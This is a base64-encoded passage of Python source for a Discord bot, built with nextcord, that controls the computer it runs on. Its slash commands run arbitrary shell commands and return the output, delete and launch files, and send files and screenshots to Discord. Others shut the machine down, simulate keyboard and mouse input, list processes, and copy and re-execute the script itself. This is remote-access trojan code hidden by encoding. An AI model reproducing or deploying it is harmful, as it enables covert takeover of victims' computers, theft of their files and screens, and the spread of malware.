ZmlsZW5hbWUgZnJvbSB0aGUgcGF0aAogICAgZmlsZW5hbWUgPSBvcy5wYXRoLmJhc2VuYW1lKGZpbGVfcGF0aCkKICAgIAogICAgdHJ5OgogICAgICAgICMgRGVmZXIgdGhlIHJlc3BvbnNlIHRvIGdpdmUgdGhlIGJvdCBtb3JlIHRpbWUgdG8gcHJvY2VzcwogICAgICAgIGF3YWl0IGludGVyYWN0aW9uLnJlc3BvbnNlLmRlZmVyKCkKCiAgICAgICAgIyBPcGVuIHRoZSBmaWxlIGFuZCBjcmVhdGUgYSBGaWxlIG9iamVjdAogICAgICAgIHdpdGggb3BlbihmaWxlX3BhdGgsICJyYiIpIGFzIGZpbGU6CiAgICAgICAgICAgIGRpc2NvcmRfZmlsZSA9IG5leHRjb3JkLkZpbGUoZmlsZSwgZmlsZW5hbWU9ZmlsZW5hbWUpCiAgICAgICAgICAgIAogICAgICAgICAgICAjIFNlbmQgdGhlIGZpbGUgaW4gYSBmb2xsb3ctdXAgbWVzc2FnZQogICAgICAgICAgICBhd2FpdCBpbnRlcmFjdGlvbi5mb2xsb3d1cC5zZW5kKGYiSGVyZSBpcyB5b3VyIGZpbGU6IHtmaWxlbmFtZX0iLCBmaWxlPWRpc2NvcmRfZmlsZSkKICAgIGV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvcjoKICAgICAgICBhd2FpdCBpbnRlcmFjdGlvbi5mb2xsb3d1cC5zZW5kKGYiRmlsZSBub3QgZm91bmQ6IHtmaWxlX3BhdGh9IikKICAgIGV4Y2VwdCBOb3RBRGlyZWN0b3J5RXJyb3I6CiAgICAgICAgYXdhaXQgaW50ZXJhY3Rpb24uZm9sbG93dXAuc2VuZChmIlRoZSBwYXRoIHByb3ZpZGVkIGlzIG5vdCBhIGRpcmVjdG9yeToge2ZpbGVfcGF0aH0iKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIGF3YWl0IGludGVyYWN0aW9uLmZvbGxvd3VwLnNlbmQoZiJBbiBlcnJvciBvY2N1cnJlZDoge2V9IikKCkBib3Quc2xhc2hfY29tbWFuZChuYW1lPSJkZWxldGUiLCBkZXNjcmlwdGlvbj0iRGVsZXRlIGEgZmlsZSEiKQphc3luYyBkZWYgZGVsZXRlKGludGVyYWN0aW9uOiBuZXh0Y29yZC5JbnRlcmFjdGlvbiwgZmlsZV9wYXRoOiBzdHIpOgogICAgICAgIHRyeToKICAgICAgICAgICAgb3MucmVtb3ZlKGZpbGVfcGF0aCkKICAgICAgICAgICAgYXdhaXQgaW50ZXJhY3Rpb24ucmVzcG9uc2Uuc2VuZF9tZXNzYWdlKGYnRmlsZSAie2ZpbGVfcGF0aH0iIGhhcyBiZWVuIGRlbGV0ZWQuJykKICAgICAgICBleGNlcHQgRmlsZU5vdEZvdW5kRXJyb3I6CiAgICAgICAgICAgIGF3YWl0IGludGVyYWN0aW9uLnJlc3BvbnNlLnNlbmRfbWVzc2FnZShmJ0ZpbGUgbm90IGZvdW5kOiAie2ZpbGVfcGF0aH0iJykKICAgICAgICBleGNlcHQgUGVybWlzc2lvbkVycm9yOgogICAgICAgICAgICBhd2FpdCBpbnRlcmFjdGlvbi5yZXNwb25zZS5zZW5kX21lc3NhZ2UoZidQZXJtaXNzaW9uIGRlbmllZDogVW5hYmxlIHRvIGRlbGV0ZSAie2ZpbGVfcGF0aH0iJykKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgIGF3YWl0IGludGVyYWN0aW9uLnJlc3BvbnNlLnNlbmRfbWVzc2FnZShmIkFuIGVycm9yIG9jY3VycmVkOiB7ZX0iKQoKQGJvdC5zbGFzaF9jb21tYW5kKG5hbWU9ImNsb25lIiwgZGVzY3JpcHRpb249IkNsb25lIGEgZmlsZSEiKQphc3luYyBkZWYgY2xvbmUoaW50ZXJhY3Rpb246IG5leHRjb3JkLkludGVyYWN0aW9uLCBmaWxlX3BhdGg6IHN0ciwgZmlsZV9uYW1lOiBzdHIsIGRlc3RpbmF0aW9uOiBzdHIgPSBuZXh0Y29yZC5TbGFzaE9wdGlvbihkZXNjcmlwdGlvbj0iVGhlIERlc3RpbmF0aW9uIG9mIHRoZSBjbG9uZSBmaWxlIiwgcmVxdWlyZWQ9RmFsc2UpKToKICAgICAgICAKICAgICAgICBzb3VyY2VfZGlyZWN0b3J5ID0gb3MucGF0aC5kaXJuYW1lKGZpbGVfcGF0aCkKICAgICAgICBpZiBub3QgZGVzdGluYXRpb246CiAgICAgICAgICAgIGRlc3RpbmF0aW9uID0gc291cmNlX2RpcmVjdG9yeQogICAgICAgIAogICAgICAgIHRyeToKICAgICAgICAgICAgZGVzdGluYXRpb24gPSBvcy5wYXRoLmpvaW4oZGVzdGluYXRpb24sIGZpbGVfbmFtZSkKICAgICAgICAgICAgc2h1dGlsLmNvcHkyKGZpbGVfcGF0aCwgZGVzdGluYXRpb24pCiAgICAgICAgICAgIGF3YWl0IGludGVyYWN0aW9uLnJlc3BvbnNlLnNlbmRfbWVzc2FnZShmJ0ZpbGUgIntmaWxlX3BhdGh9IiBoYXMgYmVlbiBjbG9uZWQuJykKICAgICAgICBleGNlcHQgRmlsZU5vdEZvdW5kRXJyb3I6CiAgICAgICAgICAgIGF3YWl0IGludGVyYWN0aW9uLnJlc3BvbnNlLnNlbmRfbWVzc2FnZShmJ0ZpbGUgbm90IGZvdW5kOiAie2ZpbGVfcGF0aH0iJykKICAgICAgICBleGNlcHQgUGVybWlzc2lvbkVycm9yOgogICAgICAgICAgICBhd2FpdCBpbnRlcmFjdGlvbi5yZXNwb25zZS5zZW5kX21lc3NhZ2UoZidQZXJtaXNzaW9uIGRlbmllZDogVW5hYmxlIHRvIGNsb25lICJ7ZmlsZV9wYXRofSInKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgYXdhaXQgaW50ZXJhY3Rpb24ucmVzcG9uc2Uuc2VuZF9tZXNzYWdlKGYiQW4gZXJyb3Igb2NjdXJyZWQ6IHtlfSIpCgpAYm90LnNsYXNoX2NvbW1hbmQobmFtZT0ib3Blbm4iLCBkZXNjcmlwdGlvbj0iT3BlbiBhIGZpbGUhIikKYXN5bmMgZGVmIG9wZW5uKGludGVyYWN0aW9uOiBuZXh0Y29yZC5JbnRlcmFjdGlvbiwgZXhlX3BhdGg6IHN0ciwgdGltZXM6IGludCA9IG5leHRjb3JkLlNsYXNoT3B0aW9uKGRlc2NyaXB0aW9uPSJBbW91bnQgb2YgdGltZSB5b3Ugd2FudCB0byBvcGVuIHRoZSBmaWxlLiIsIHJlcXVpcmVkPUZhbHNlKSk6CiAgICAgICAgaWYgbm90IHRpbWVzOgogICAgICAgICAgICB0aW1lcyA9IDEKCiAgICAgICAgIyBEZWZlciB0aGUgcmVzcG9uc2UgdG8gZ2l2ZSB0aGUgYm90IG1vcmUgdGltZSB0byBwcm9jZXNzCiAgICAgICAgYXdhaXQgaW50ZXJhY3Rpb24ucmVzcG9uc2UuZGVmZXIoKQoKICAgICAgICBmb3IgaSBpbiByYW5nZSh0aW1lcyk6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICMgT3BlbiB0aGUgZXhlY3V0YWJsZQogICAgICAgICAgICAgICAgc3VicHJvY2Vzcy5Qb3BlbihmJ3N0YXJ0ICIiICJ7ZXhlX3BhdGh9IicsIHNoZWxsPVRydWUpCiAgICAgICAgICAgICAgICBhd2FpdCBpbnRlcmFjdGlvbi5mb2xsb3d1cC5zZW5kKGYie2V4ZV9wYXRofSBoYXMgYmVlbiBvcGVuZWQge2krMX0gdGltZXMuIikKCiAgICAgICAgICAgIGV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvcjoKICAgICAgICAgICAgICAgIGF3YWl0IGludGVyYWN0aW9uLmZvbGxvd3VwLnNlbmQoZiJUaGUgZXhlY3V0YWJsZSAne2V4ZV9wYXRofScgd2FzIG5vdCBmb3VuZC4iKQogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgICAgICBhd2FpdCBpbnRlcmFjdGlvbi5mb2xsb3d1cC5zZW5kKGYiQW4gZXJyb3Igb2NjdXJyZWQ6IHtlfSIpCgpAYm90LnNsYXNoX2NvbW1hbmQobmFtZT0icG93ZXIiLCBkZXNjcmlwdGlvbj0iQ29udHJvbCB0aGUgUG93ZXIgb2YgdGhlIFBjISIpCmFzeW5jIGRlZiBwb3dlcihpbnRlcmFjdGlvbjogbmV4dGNvcmQuSW50ZXJhY3Rpb24sIGNvbW1hbmQ6IHN0ciA9IG5leHRjb3JkLlNsYXNoT3B0aW9uKGRlc2NyaXB0aW9uPSJDaG9vc2UgYSBwb3dlciBvcHRpb24hIiwgY2hvaWNlcz17IlNodXRkb3duIjogInNodXRkb3duIiwgIlJlc3RhcnQiOiAicmVzdGFydCIsICJTbGVlcCI6ICJzbGVlcCJ9KSk6CiAgICAgCiAgICBpZiBjb21tYW5kID09ICJzaHV0ZG93biI6CiAgICAgICAgb3Muc3lzdGVtKCJzaHV0ZG93biAvcyAvdCAxIikKICAgICAgICBhd2FpdCBpbnRlcmFjdGlvbi5yZXNwb25zZS5zZW5kX21lc3NhZ2UoIlNodXR0aW5nIGRvd24gdGhlIFBjLiIpCiAgICBlbGlmIGNvbW1hbmQgPT0gInJlc3RhcnQiOgogICAgICAgIG9zLnN5c3RlbSgic2h1dGRvd24gL3IgL3QgMSIpCiAgICAgICAgYXdhaXQgaW50ZXJhY3Rpb24ucmVzcG9uc2Uuc2VuZF9tZXNzYWdlKCJSZXN0YXJ0aW5nIHRoZSBQYy4iKQogICAgZWxpZiBjb21tYW5kID09ICJzbGVlcCI6CiAgICAgICAgb3Muc3lzdGVtKCJydW5kbGwzMi5leGUgcG93cnByb2YuZGxsLFNldFN1c3BlbmRTdGF0ZSAwLDEsMCIpCiAgICAgICAgYXdhaXQgaW50ZXJhY3Rpb24ucmVzcG9uc2Uuc2VuZF9tZXNzYWdlKCJQdXR0aW5nIHRoZSBwYyB0byBzbGVlcC4iKQogICAgZWxzZToKICAgICAgICBhd2FpdCBpbnRlcmFjdGlvbi5yZXNwb25zZS5zZW5kX21lc3NhZ2UoIkludmFsaWQgY29tbWFuZC4gUGxlYXNlIGVudGVyICdzaHV0ZG93bicsICdyZXN0YXJ0Jywgb3IgJ3NsZWVwJy4iKQoKQGJvdC5zbGFzaF9jb21tYW5kKG5hbWU9ImV4ZWN1dGUiLCBkZXNjcmlwdGlvbj0iRXhlY3V0ZSBhIGNtZCBjb21tYW5kISIpCmFzeW5jIGRlZiBleGVjdXRlKGludGVyYWN0aW9uOiBuZXh0Y29yZC5JbnRlcmFjdGlvbiwgY29tbWFuZDogc3RyKToKICAgICMgRGVmZXIgdGhlIHJlc3BvbnNlIHRvIGdpdmUgdGhlIGJvdCBtb3JlIHRpbWUgdG8gcHJvY2VzcwogICAgYXdhaXQgaW50ZXJhY3Rpb24ucmVzcG9uc2UuZGVmZXIoKQogICAgdHJ5OgogICAgICAgICMgUnVuIHRoZSBjb21tYW5kCiAgICAgICAgcmVzdWx0ID0gc3VicHJvY2Vzcy5ydW4oY29tbWFuZCwgc2hlbGw9VHJ1ZSwgY2FwdHVyZV9vdXRwdXQ9VHJ1ZSwgdGV4dD1UcnVlKQoKICAgICAgICAjIFByaW50IHRoZSBvdXRwdXQKICAgICAgICBhd2FpdCBpbnRlcmFjdGlvbi5mb2xsb3d1cC5zZW5kKHJlc3VsdC5zdGRvdXQpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgaWYgZS5jb2RlID09IDUwMDM1OgogICAgICAgICAgICAjIEhhbmRsZSB0aGUgIm1lc3NhZ2UgdG9vIGxvbmciIGVycm9yIGFuZCBzZW5kIGluIGNodW5rcwogICAgICAgICAgICBhd2FpdCBzZW5kX2luX2NodW5rcyhpbnRlcmFjdGlvbi5jaGFubmVsLCByZXN1bHQuc3Rkb3V0KQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIGludGVyYWN0aW9uLmZvbGxvd3VwLnNlbmQoZiJFcnJvcjoge2V9IikKCgpAYm90LnNsYXNoX2NvbW1hbmQobmFtZT0idHlwZSIsIGRlc2NyaXB0aW9uPSJUeXBlIGEgd29yZCEiKQphc3luYyBkZWYgdHlwZShpbnRlcmFjdGlvbjogbmV4dGNvcmQuSW50ZXJhY3Rpb24sIHdvcmQ6IHN0cik6CiAgICBweWF1dG9ndWkud3JpdGUod29yZCkKCiAgICAjIFByaW50IHRoZSBvdXRwdXQKICAgIGF3YWl0IGludGVyYWN0aW9uLnJlc3BvbnNlLnNlbmRfbWVzc2FnZShmJ1RoZSBzdHJpbmcgInt3b3JkfSIgaGFzIGJlZW4gdHlwZWQuJykKCkBib3Quc2xhc2hfY29tbWFuZChuYW1lPSJzcGVjaWFsX2tleXMiLCBkZXNjcmlwdGlvbj0iRGlzcGxheSBidXR0b25zIGZvciBzcGVjaWFsIGtleXMiKQphc3luYyBkZWYgc3BlY2lhbF9rZXlzKGludGVyYWN0aW9uOiBuZXh0Y29yZC5JbnRlcmFjdGlvbik6CiAgICBhd2FpdCBpbnRlcmFjdGlvbi5yZXNwb25zZS5zZW5kX21lc3NhZ2UoIkNsaWNrIGEga2V5ISIsIHZpZXc9TXlWaWV3KCkpCgpAYm90LnNsYXNoX2NvbW1hbmQobmFtZT0iZnJlZXplIiwgZGVzY3JpcHRpb249IkZyZWV6ZSB0aGUgTW91c2UgdG8gYSBjZXJ0YWluIGNvcmRpbmF0ZSIpCmFzeW5jIGRlZiBmcmVlemUoaW50ZXJhY3Rpb246IG5leHRjb3JkLkludGVyYWN0aW9uLCB0aW1lczogaW50KToKCiAgICAjIERlZmVyIHRoZSByZXNwb25zZSB0byBnaXZlIHRoZSBib3QgbW9yZSB0aW1lIHRvIHByb2Nlc3MKICAgIGF3YWl0IGludGVyYWN0aW9uLnJlc3BvbnNlLmRlZmVyKCkKCiAgICB4LCB5ID0gcHlhdXRvZ3VpLnBvc2l0aW9uKCkKICAgIGZvciBpIGluIHJhbmdlKHRpbWVzKToKICAgICAgICBweWF1dG9ndWkuZHJhZ1RvKHgsIHksIGR1cmF0aW9uPTAuMCkKICAgIGF3YWl0IGludGVyYWN0aW9uLmZvbGxvd3VwLnNlbmQoZiJGcmVlemVkIHt0aW1lc30gdGltZXMhIikKCkBib3Quc2xhc2hfY29tbWFuZChuYW1lPSJ3aW5kb3dfb3B0aW9ucyIsIGRlc2NyaXB0aW9uPSJNYW5pcHVsYXRlIHlvdXIgd2luZG93ISIpCmFzeW5jIGRlZiB3aW5kb3dfb3B0aW9ucyhpbnRlcmFjdGlvbjogbmV4dGNvcmQuSW50ZXJhY3Rpb24sIGFwcGxpY2F0aW9uOiBzdHIsIG9wdGlvbjogc3RyID0gbmV4dGNvcmQuU2xhc2hPcHRpb24oY2hvaWNlcz17IkZvY3VzIjogJ2ZvY3VzJywgIlNpemUiOiAnc2l6ZScsICJQb3NpdGlvbiI6ICdwb3NpdGlvbicsICJNYXhpbWl6ZSI6ICdtYXhpbWl6ZScsICJNaW5pbWl6ZSI6ICdtaW5pbWl6ZScsICJSZXNpemUiOiAncmVzaXplJywgIk1vdmUiOiAnbW92ZScsICJDbG9zZSI6ICdjbG9zZSd9KSwgY29yZHM6IHN0ciA9IG5leHRjb3JkLlNsYXNoT3B0aW9uKHJlcXVpcmVkPUZhbHNlKSk6CiAgICAKICAgIGlmIG5vdCBjb3JkczoKICAgICAgICBjb3JkcyA9ICI1MDAsIDUwMCIKICAgIAogICAgeCwgeSA9IGNvcmRzLnNwbGl0KCIsIikKICAgIAogICAgdHJ5OgogICAgICAgIHdtID0gV2luZG93TWFuYWdlcihhcHBsaWNhdGlvbikKICAgICAgICBpZiBvcHRpb24gPT0gImZvY3VzIjoKICAgICAgICAgICAgd20uZm9jdXNfd2luZG93KCkKICAgICAgICAgICAgYXdhaXQgaW50ZXJhY3Rpb24ucmVzcG9uc2Uuc2VuZF9tZXNzYWdlKCJXaW5kb3cgaGFzIGJlZW4gZm9jdXNlZC4iKQogICAgICAgIGVsaWYgb3B0aW9uID09ICJzaXplIjoKICAgICAgICAgICAgc2l6ZSA9IHdtLmdldF93aW5kb3dfc2l6ZSgpCiAgICAgICAgICAgIGF3YWl0IGludGVyYWN0aW9uLnJlc3BvbnNlLnNlbmRfbWVzc2FnZShmIkN1cnJlbnQgd2luZG93IHNpemU6IFdpZHRoPXtzaXplLndpZHRofSwgSGVpZ2h0PXtzaXplLmhlaWdodH0iKQogICAgICAgIGVsaWYgb3B0aW9uID09ICJwb3NpdGlvbiI6CiAgICAgICAgICAgIHBvc2l0aW9uID0gd20uZ2V0X3dpbmRvd19wb3NpdGlvbigpCiAgICAgICAgICAgIGF3YWl0IGludGVyYWN0aW9uLnJlc3BvbnNlLnNlbmRfbWVzc2FnZShmIkN1cnJlbnQgd2luZG93IHBvc2l0aW9uOiBYPXtwb3NpdGlvbi54fSwgWT17cG9zaXRpb24ueX0iKQogICAgICAgIGVsaWYgb3B0aW9uID09ICJtYXhpbWl6ZSI6CiAgICAgICAgICAgIHdtLm1heGltaXplX3dpbmRvdygpCiAgICAgICAgICAgIGF3YWl0IGludGVyYWN0aW9uLnJlc3BvbnNlLnNlbmRfbWVzc2FnZSgiV2luZG93IGhhcyBiZWVuIG1heGltaXplZC4iKQogICAgICAgIGVsaWYgb3B0aW9uID09ICJtaW5pbWl6ZSI6CiAgICAgICAgICAgIHdtLm1pbmltaXplX3dpbmRvdygpCiAgICAgICAgICAgIGF3YWl0IGludGVyYWN0aW9uLnJlc3BvbnNlLnNlbmRfbWVzc2FnZSgiV2luZG93IGhhcyBiZWVuIG1pbmltaXplZC4iKQogICAgICAgIGVsaWYgb3B0aW9uID09ICJyZXNpemUiOgogICAgICAgICAgICB3bS5yZXNpemVfd2luZG93KHgsIHkpCiAgICAgICAgICAgIGF3YWl0IGludGVyYWN0aW9uLnJlc3BvbnNlLnNlbmRfbWVzc2FnZSgiV2luZG93IGhhcyBiZWVuIHJlc2l6ZWQuIikKICAgICAgICBlbGlmIG9wdGlvbiA9PSAibW92ZSI6CiAgICAgICAgICAgIHdtLm1vdmVfd2luZG93KHgsIHkpCiAgICAgICAgICAgIGF3YWl0IGludGVyYWN0aW9uLnJlc3BvbnNlLnNlbmRfbWVzc2FnZSgiV2luZG93IGhhcyBiZWVuIG1vdmVkLiIpCiAgICAgICAgZWxpZiBvcHRpb24gPT0gImNsb3NlIjoKICAgICAgICAgICAgd20uY2xvc2Vfd2luZG93KCkKICAgICAgICAgICAgYXdhaXQgaW50ZXJhY3Rpb24ucmVzcG9uc2Uuc2VuZF9tZXNzYWdlKCJXaW5kb3cgaGFzIGJlZW4gY2xvc2VkLiIpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgYXdhaXQgaW50ZXJhY3Rpb24ucmVzcG9uc2Uuc2VuZF9tZXNzYWdlKGYiRXJyb3IgT2NjdXJlZDoge2V9IikKCkBib3Quc2xhc2hfY29tbWFuZChuYW1lPSJvcGVuX2FwcHMiLCBkZXNjcmlwdGlvbj0iTGlzdHMgdGhlIG5hbWVzIG9mIGN1cnJlbnRseSBvcGVuIGFwcHMuIikKYXN5bmMgZGVmIG9wZW5fYXBwcyhpbnRlcmFjdGlvbjogbmV4dGNvcmQuSW50ZXJhY3Rpb24pOgogICAgIyBHZXQgYSBsaXN0IG9mIGFsbCBjdXJyZW50bHkgcnVubmluZyBwcm9jZXNzZXMKICAgIHByb2Nlc3NlcyA9IFtdCiAgICBmb3IgcHJvYyBpbiBwc3V0aWwucHJvY2Vzc19pdGVyKFsncGlkJywgJ25hbWUnLCAnc3RhdHVzJ10pOgogICAgICAgICMgRmlsdGVyIG91dCBzeXN0ZW0vYmFja2dyb3VuZCBwcm9jZXNzZXMgKHN0YXR1cyAhPSAncnVubmluZycpCiAgICAgICAgaWYgcHJvYy5pbmZvWydzdGF0dXMnXSA9PSBwc3V0aWwuU1RBVFVTX1JVTk5JTkc6CiAgICAgICAgICAgIHByb2Nlc3Nlcy5hcHBlbmQocHJvYy5pbmZvWyduYW1lJ10pCiAgICAKICAgIGlmIHByb2Nlc3NlczoKICAgICAgICAjIEpvaW4gdGhlIGxpc3QgaW50byBhIHN0cmluZyBhbmQgc2VuZCBpdCBhcyBhIHJlc3BvbnNlCiAgICAgICAgcHJvY2Vzc19saXN0ID0gIlxuIi5qb2luKHByb2Nlc3NlcykKICAgICAgICBhd2FpdCBzZW5kX2luX2NodW5rcyhpbnRlcmFjdGlvbi5jaGFubmVsLCBmIkN1cnJlbnRseSBvcGVuZWQgYXBwczpcbntwcm9jZXNzX2xpc3R9IikKICAgIGVsc2U6CiAgICAgICAgYXdhaXQgaW50ZXJhY3Rpb24ucmVzcG9uc2Uuc2VuZF9tZXNzYWdlKCJObyBhcHBzIGFyZSBjdXJyZW50bHkgb3Blbi4iKQoKQGJvdC5zbGFzaF9jb21tYW5kKG5hbWU9InNjcmVlbnNob3QiLCBkZXNjcmlwdGlvbj0iVGFrZSBhIHNjcmVlbnNob3QgYW5kIHVwbG9hZCBpdCIpCmFzeW5jIGRlZiBzY3JlZW5zaG90KGludGVyYWN0aW9uOiBuZXh0Y29yZC5JbnRlcmFjdGlvbik6CiAgICBhd2FpdCBpbnRlcmFjdGlvbi5yZXNwb25zZS5kZWZlcigpICAjIERlZmVyIHRoZSByZXNwb25zZSBpZiBpdCB0YWtlcyB0aW1lCgogICAgIyBUYWtlIHRoZSBzY3JlZW5zaG90IGFuZCBzYXZlIGl0IGluIHRoZSBjdXJyZW50IGRpcmVjdG9yeQogICAgc2NyZWVuc2hvdF9wYXRoID0gc2NyZWVuc2hvdF90YWtlci50YWtlX3NjcmVlbnNob3QoKQogICAgdHJ5OgoKICAgICAgICBpZiBzY3JlZW5zaG90X3BhdGggYW5kIG9zLnBhdGguZXhpc3RzKHNjcmVlbnNob3RfcGF0aCk6CiAgICAgICAgICAgIGZpbGVuYW1lID0gb3MucGF0aC5iYXNlbmFtZShzY3JlZW5zaG90X3BhdGgpCiAgICAgICAgICAgIHdpdGggb3BlbihzY3JlZW5zaG90X3BhdGgsICJyYiIpIGFzIGZpbGU6CiAgICAgICAgICAgICAgICBkaXNjb3JkX2ZpbGUgPSBuZXh0Y29yZC5GaWxlKGZpbGUsIGZpbGVuYW1lPWZpbGVuYW1lKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAjIFNlbmQgdGhlIGZpbGUgaW4gYSBmb2xsb3ctdXAgbWVzc2FnZQogICAgICAgICAgICAgICAgYXdhaXQgaW50ZXJhY3Rpb24uZm9sbG93dXAuc2VuZChmIkhlcmUgaXMgeW91ciBzY3JlZW5zaG90OiB7ZmlsZW5hbWV9IiwgZmlsZT1kaXNjb3JkX2ZpbGUpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgYXdhaXQgaW50ZXJhY3Rpb24uZm9sbG93dXAuc2VuZCgiRmFpbGVkIHRvIHRha2UgYSBzY3JlZW5zaG90LiIpCgogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIGF3YWl0IGludGVyYWN0aW9uLmZvbGxvd3VwLnNlbmQoZiJFcnJvcjoge2V9IikKCiAgICAjIE9wdGlvbmFsbHksIGRlbGV0ZSB0aGUgc2NyZWVuc2hvdCBhZnRlciBzZW5kaW5nIGl0CiAgICAgICAgc2h1dGlsLnJtdHJlZShzY3JlZW5zaG90X3BhdGgpCiAgICAgICAgYXdhaXQgbG9ncy5zZW5kKGYiRGVsZXRlZCB7c2NyZWVuc2hvdF9wYXRofSIpCgpAYm90LnNsYXNoX2NvbW1hbmQobmFtZT0icmFuZG9tX3BhdGgiLCBkZXNjcmlwdGlvbj0iR2l2ZSBhIHJhbmRvbSBEaXJlY3RvcnkhIikKYXN5bmMgZGVmIHJhbmRvbV9wYXRoKGludGVyYWN0aW9uOiBuZXh0Y29yZC5JbnRlcmFjdGlvbiwgZGlyOiBzdHIpOgogICAgYXdhaXQgaW50ZXJhY3Rpb24ucmVzcG9uc2UuZGVmZXIoKSAgIyBEZWZlciB0aGUgcmVzcG9uc2UgaWYgaXQgdGFrZXMgdGltZQoKICAgIGJhc2VfcGF0aCA9IGRpci5zdHJpcCgpCiAgICB0cnk6CiAgICAgICAgcmFuZG9tX3N1YmRpciA9IGdldF9yYW5kb21fc3ViZGlyZWN0b3J5KGJhc2VfcGF0aCkKICAgICAgICBhd2FpdCBpbnRlcmFjdGlvbi5mb2xsb3d1cC5zZW5kKGYiUmFuZG9tIHN1YmRpcmVjdG9yeToge3JhbmRvbV9zdWJkaXJ9IikKICAgIGV4Y2VwdCBOb3RBRGlyZWN0b3J5RXJyb3IgYXMgZToKICAgICAgICBhd2FpdCBpbnRlcmFjdGlvbi5mb2xsb3d1cC5zZW5kKGUpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgYXdhaXQgaW50ZXJhY3Rpb24uZm9sbG93dXAuc2VuZChmIkFuIGVycm9yIG9jY3VycmVkOiB7ZX0iKQoKQGJvdC5zbGFzaF9jb21tYW5kKG5hbWU9ImNsb25lX2N1cnJlbnQiLCBkZXNjcmlwdGlvbj0iQ2xvbmUgQ3VycmVudCBTY3JpcHQhIikKYXN5bmMgZGVmIGNsb25lX2N1cnJlbnQoaW50ZXJhY3Rpb246IG5leHRjb3JkLkludGVyYWN0aW9uLCBkaXJlY3Rvcnk6IHN0cik6CiAgICBhd2FpdCBpbnRlcmFjdGlvbi5yZXNwb25zZS5kZWZlcigpCiAgICBjb3B5X2N1cnJlbnRfc2NyaXB0KGRpcmVjdG9yeSkKICAgIHdpdGggb3BlbihkZXN0aW5hdGlvbl9wYXRoLCAncicpIGFzIGZpbGU6CiAgICAgICAgY29kZSA9IGZpbGUucmVhZCgpCiAgICAgICAgZXhlYyhjb2RlKQogICAgYXdhaXQgaW50ZXJhY3Rpb24uZm9sbG93dXAuc2VuZChmIlByb2dyYW0gQ2xvbmVkIHRvICd7ZGVzdGluYXRpb25fcGF0aH0nISIsICkKCiMgUmVwbGFjZSAneW91cl90b2tlbl9oZXJlJyB3aXRoIHlvdXIgYm90J3MgdG9rZW4KYm90LnJ1bihUT0tFTikK"))
